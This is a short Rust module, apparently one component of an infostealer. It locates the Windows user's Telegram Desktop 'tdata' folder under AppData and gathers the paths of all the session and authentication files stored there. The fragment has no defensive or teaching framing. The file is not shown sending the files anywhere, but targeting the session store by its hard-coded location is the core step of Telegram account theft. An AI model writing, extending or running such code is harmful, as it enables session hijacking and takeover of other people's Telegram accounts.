pub mod telegram_md
{
	// PACKAGES
	use std::env;
	use std::fs;
	use std::io::Result;


	fn copy_files(tg_path: String) -> Result<Vec<String>>
	{
		let mut files = Vec::new();
		let dir = fs::read_dir(&tg_path)?;

		for x in dir
		{
			let i = x?;
			let file_name = i.file_name();
			let file_name_str = file_name.to_string_lossy();

			if i.file_type()?.is_dir() { continue; }
			else { files.push(format!("{}//{}", tg_path, file_name_str)); }	
		}

		Ok(files)
	}


	pub fn start() -> Vec<String>
	{
		let mut x: Vec<String> = Vec::new();
		let username: String = env::var("USERNAME").unwrap();
		let tg_path: String = format!("C:\\Users\\{}\\AppData\\Roaming\\Telegram Desktop\\tdata", username);

		// CHECKING TELEGRAM'S FOLDER EXIST OR DOESN'T -> CHECKING IT'S FOLDER OR ISN'T
		if let Ok(metadata) = fs::metadata(&tg_path) {
			if metadata.is_dir() { x = copy_files(tg_path).unwrap(); }
		}

		return x;
	}
}